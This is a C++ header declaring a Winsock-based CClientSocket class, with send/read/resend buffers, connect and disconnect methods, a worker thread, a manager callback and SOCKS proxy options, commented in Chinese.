// ClientSocket.h: interface for the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_)
#define AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_
#include <winsock2.h>
#include <mswsock.h>
#include "Buffer.h"	// Added by ClassView
#include "Manager.h"
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

// Change at your Own Peril
enum									// 代理,无代理, socks v4, socks v5
{
	PROXY_NONE,
	PROXY_SOCKS_VER4 = 4,
	PROXY_SOCKS_VER5	
};


class CClientSocket  
{
	friend class CManager;
public:
	CBuffer m_WriteBuffer;						// 写缓存
	CBuffer	m_ResendWriteBuffer;				// 重传写缓存
	CBuffer m_ReadBuffer;						// 读缓存

	void Disconnect();										
	bool Connect(LPCTSTR lpszHost, UINT nPort);
	int Send(LPBYTE lpData, UINT nSize);
	void OnRead(LPBYTE lpBuffer, DWORD dwIoSize);
	void setManagerCallBack(CManager *pManager);
	void run_event_loop();
	bool IsRunning();

	HANDLE m_hWorkerThread;						// 工作者线程句柄
	SOCKET m_Socket;							// 与服务器连接的套接字
	HANDLE m_hEvent;							// 事件

	CClientSocket();
	virtual ~CClientSocket();
private:
	static DWORD WINAPI WorkThread(LPVOID lparam);						// 工作者线程
	int SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize);
	bool m_bIsRunning;													//  是否正在运行
	CManager	*m_pManager;						

};



#endif // !defined(AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_)
